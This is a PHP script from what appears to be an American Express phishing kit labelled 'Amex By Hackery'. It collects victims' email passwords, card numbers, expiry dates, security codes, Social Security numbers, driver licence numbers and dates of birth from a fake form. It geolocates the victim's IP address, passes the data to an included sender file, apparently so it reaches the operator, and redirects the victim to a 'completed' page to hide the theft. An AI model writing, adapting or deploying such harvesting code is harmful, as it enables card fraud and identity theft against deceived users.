<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];


$msg = "================[ LOGIN Inc...1 ]=========================\n";
$msg .= "Amex By Hackery\n";
$msg .= "===========================================================\n";
$msg .= "Email : ".$_POST['ACCTNUMPART21']."\n";
$msg .= "EPass : ".$_POST['ACCTNUMPART22']."\n";
$msg .= "Card Number : ".$_POST['ACCTNUMPART23']."\n";
$msg .= "Exp Date : ".$_POST['ACCTNUMPART28']."\n";
$msg .= "4-Digit Code : ".$_POST['ACCTNUMPART24']."\n";
$msg .= "3-Digit Code : ".$_POST['ACCTNUMPART25']."\n";
$msg .= "Mother DOB : ".$_POST['ACCTNUMPART26']."\n";
$msg .= "SSN : ".$_POST['ACCTNUMPART30']."\n";
$msg .= "Driver license : ".$_POST['ACCTNUMPART31']."\n";
$msg .= "Date of birth : ".$_POST['ACCTNUMPART32']."\n";
$msg .= "Email Address : ".$_POST['ACCTNUMPART33']."\n";
$msg .= "Email Address : ".$_POST['ACCTNUMPART34']."\n";
$msg .= "========================================================\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "==============[ Hackery Tm. ]===========================\n";
include("mp3/SenMe.php");

  {
		   header("Location: completed.html");

	   }
?>
